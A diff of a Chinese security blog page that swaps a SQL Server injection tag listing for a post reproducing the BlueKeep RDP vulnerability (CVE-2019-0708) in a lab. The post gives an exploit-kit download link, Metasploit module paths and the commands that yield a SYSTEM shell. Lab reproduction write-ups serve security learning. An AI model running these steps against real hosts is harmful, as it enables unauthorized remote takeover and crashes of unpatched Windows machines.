@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://klforever.cn">
-  <title>Tag: sql server | WLSMILE Blog</title>
+  <title>WLSMILE Blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
+    
+    <!-- <meta name="keywords" content="">
+    <meta name="description" content=""> -->
+  
   <meta property="og:type" content="website">
 <meta property="og:title" content="WLSMILE Blog">
-<meta property="og:url" content="http://klforever.cn/tags/sql-server/index.html">
+<meta property="og:url" content="http://klforever.cn/page/3/index.html">
 <meta property="og:site_name" content="WLSMILE Blog">
 <meta property="og:locale" content="cn">
 <meta name="twitter:card" content="summary">
@@ -203,207 +207,173 @@
           </div>
           <div id="js-content" class="content-ll">
             
-  
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2019/10/14/8/" class="archive-article-date">
-        <time datetime="2019-10-14T11:13:59.452Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-14</time>
-</a>
 
-        </div>
-    	 
+  
+    <article id="post-3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
   
     <h1 itemprop="name">
 	
-	  <a class="archive-article-title" href="/2019/10/14/8/" target="_blank">SQL SERVER 注入（三）</a>
+	  <a class="article-title" href="/2019/09/11/3/" target="_blank">RDP漏洞CVE-2019-0708复现</a>
   
     </h1>
   
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">注入</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql server</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Web安全//" class="article-tag-list-link color1">Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2019/10/11/7/" class="archive-article-date">
-        <time datetime="2019-10-11T13:09:17.971Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-11</time>
+  
+<a href="/2019/09/11/3/" class="archive-article-date">
+        <time datetime="2019-09-11T12:13:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-11</time>
 </a>
 
-        </div>
-    	 
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2019/10/11/7/" target="_blank">SQL SERVER 注入（二）</a>
   
-    </h1>
-  
+    
 
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1><span id="0x01-漏洞描述">0x01 漏洞描述</span></h1><blockquote>
+<p>在2019年5月，微软发布了针对远程代码执行漏洞CVE-2019-0708的补丁更新，该漏洞也称为“BlueKeep”，漏洞存在于远程桌面服务（RDS）的代码中。此漏洞是预身份验证，无需用户交互，因此具有潜在武器化蠕虫性性漏洞利用的危险。如果成功利用此漏洞，则可以使用“系统”权限执行任意代码。Microsoft安全响应中心的建议表明这个漏洞也可能会成为一种蠕虫攻击行为，类似于Wannacry和EsteemAudit等攻击行为。由于此漏洞的严重性及其对用户的潜在影响，微软采取了罕见的预警步骤，为不再受支持的Windows XP操作系统发布补丁，以保护Windows用户。<br>自该补丁于5月发布以来，该漏洞受到了安全行业的广泛关注，在野利用漏洞只是时间问题</p>
+</blockquote>
+<p>在9月7号的凌晨GitHub上公布可利用的EXP，可是正忙于项目无法及时复现。于是今晚趁着无聊复现一波，环境如下。</p>
+<p>攻击机ip（kali linux）：192.168.1.105<br>靶   机ip（win7  SP1) ：192.168.1.106<br>win7 SP1 镜像地址：<br><code>ed2k://|file|cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso|3420557312|430BEDC0F22FA18001F717F7AF08C9D5|/</code></p>
+<p>CVE-2019-0708利用套件：<br><code>https://pan.baidu.com/s/1HqmKbp4ZjMsUm0gRlTEVFQ 提取码: vkqw</code></p>
+<h1><span id="0x02-复现过程">0x02 复现过程</span></h1><p>复现的时候也是有很多问题，我使用的metasploit的版本是5.0.22，所以无法适配最新的cve-2019-0708漏洞的套件，所以要在kali中更新一波metasploit。<br>执行两行代码可直接更新：</p>
+<pre class="line-numbers language-java"><code class="language-java">apt<span class="token operator">-</span>get update
+apt<span class="token operator">-</span>get install metasploit<span class="token operator">-</span>framework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/3/1.png" alt></p>
+<p>更新过后即可将套件放至各个模块文件下，但是在这个过程中我所看到的博客里面看到的都是一个路径，而这个路径是手动安装metasploit时候的安装路径，所以在放至路径的时候出错将会出现如下错误。</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.106</span><span class="token operator">:</span><span class="token number">3389</span> <span class="token operator">-</span> Exploit failed<span class="token operator">:</span> NameError undefined local variable or method `rdp_connect' <span class="token keyword">for</span> #<span class="token operator">&lt;</span>Msf<span class="token operator">:</span><span class="token operator">:</span>Modules<span class="token operator">:</span><span class="token operator">:</span>Exploit__Windows__Rdp__Cve_2019_0708_bluekeep_rce<span class="token operator">:</span><span class="token operator">:</span>MetasploitModule<span class="token operator">:</span><span class="token number">0x00007f9c251837b0</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>复现过程中这个也是最浪费时间的一个地方了，最后在kali linux 论坛中找到了kali中metasploit的模块路径。在下载套件之后将文件移动到各个文件夹下即可</p>
+<pre class="line-numbers language-java"><code class="language-java">rdp<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>lib<span class="token operator">/</span>msf<span class="token operator">/</span>core<span class="token operator">/</span>exploit 
 
-        <div class="article-info info-on-right">
-          
+rdp_scanner<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp 
+
+cve_2019_0708_bluekeep<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp 
+
+cve_2019_0708_bluekeep_rce<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>exploits<span class="token operator">/</span>windows<span class="token operator">/</span>rdp 
+
+需要注意如果没有目录就去创建个。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>接下来就可以进入metasploit控制台操作了，进入之后先要重新加载所有模块<br><code>reload_all</code></p>
+<p>之后直接搜索0708漏洞。</p>
+<pre class="line-numbers language-java"><code class="language-java">msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">></span> search <span class="token number">0708</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+   #  Name                                             Disclosure Date  Rank    Check  Description
+   <span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span>                                             <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+   <span class="token number">0</span>  auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep     <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       normal  Yes    CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep Microsoft Remote Desktop RCE Check
+   <span class="token number">1</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>browser<span class="token operator">/</span>clear_quest_cqole        <span class="token number">2012</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">19</span>       normal  No     IBM Rational ClearQuest CQOle Remote Code Execution
+   <span class="token number">2</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>browser<span class="token operator">/</span>tumbleweed_filetransfer  <span class="token number">2008</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">07</span>       great   No     Tumbleweed FileTransfer vcst_eu<span class="token punctuation">.</span>dll ActiveX Control Buffer Overflow
+   <span class="token number">3</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce   <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       manual  Yes    CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep RDP Remote Windows Kernel Use After Free
+   <span class="token number">4</span>  auxiliary<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep     <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       normal  Yes    CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep Microsoft Remote Desktop RCE Check
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-java"><code class="language-java">use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce
+set rhosts <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.106</span>
+set target <span class="token number">3</span>
+exploit
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>target 参数在其他各个博客当中都讲到如果是VMware需要设置为3，所以我依照参考设置为3。</p>
+<p><img src="/images/3/2.png" alt></p>
+<p>现在就是开开心心的等待shell的出现啦</p>
+<p><img src="/images/3/3.png" alt></p>
+<p>等了大概两分钟，，终于结果出来了！！目标直接蓝屏！！？难道这是蓝屏的EXP！？</p>
+<p><img src="/images/3/4.png" alt></p>
+<p>于是我又尝试了两三次，，结果靶机依然是蓝屏崩溃，，这如果是生产环境可不得了。<br>最后继续看别人博客发的文章，发现也没有什么区别的，无奈之下我只好改变target参数的值了。</p>
+<pre><code>set target 1
+exploit</code></pre><p>随后进入的就是漫长的等待了，正当要绝望，准备设置为参数2的时候，他来了，他来了，他真的来了~~</p>
+<p><img src="/images/3/5.png" alt></p>
+<p>赶紧回头看看靶机有没有什么异常</p>
+<p><img src="/images/3/6.png" alt></p>
+<p>激动的时候我又在想，为什么 target 1 的时候能够成功拿下shell，看了一下info信息之后只有 target 1 后面没有什么特殊的环境限制，可能就会兼容的更多一些？？</p>
+<p>CVE-2019-0708拿下shell之后直接为SYSTEM权限</p>
+<p><img src="/images/3/7.png" alt></p>
+<p>至此复现结束。</p>
+<h1><span id="0x03-漏洞危害">0x03   漏洞危害</span></h1><p>目前公布的影响范围：</p>
+<pre class="line-numbers language-java"><code class="language-java">Windows <span class="token number">7</span>
+Windows Server <span class="token number">2008</span> R2
+Windows Server <span class="token number">2008</span>
+Windows <span class="token number">2003</span>
+Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>该漏洞的影响范围巨大，甚至能和MS17-010相媲美，但是在实际利用过程中也可能造成实际生产环境的破坏，所以在检测是还是用scanner中的检测模块较好.</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">注入</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql server</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+    
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Web安全//" class="article-tag-list-link color1">Web安全</a>
+        			<a href="/categories/其他//" class="article-tag-list-link color3">其他</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2019/09/11/3/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2019/10/11/6/" class="archive-article-date">
-        <time datetime="2019-10-11T02:28:47.791Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-11</time>
-</a>
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2019/10/11/6/" target="_blank">SQL SERVER 注入（一）</a>
-  
-    </h1>
-  
+        
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">注入</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql server</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Web安全//" class="article-tag-list-link color1">Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    </nav>
   
-
-    
 
 
           </div>
@@ -431,10 +401,10 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: false,
+		isHome: true,
 		isPost: false,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
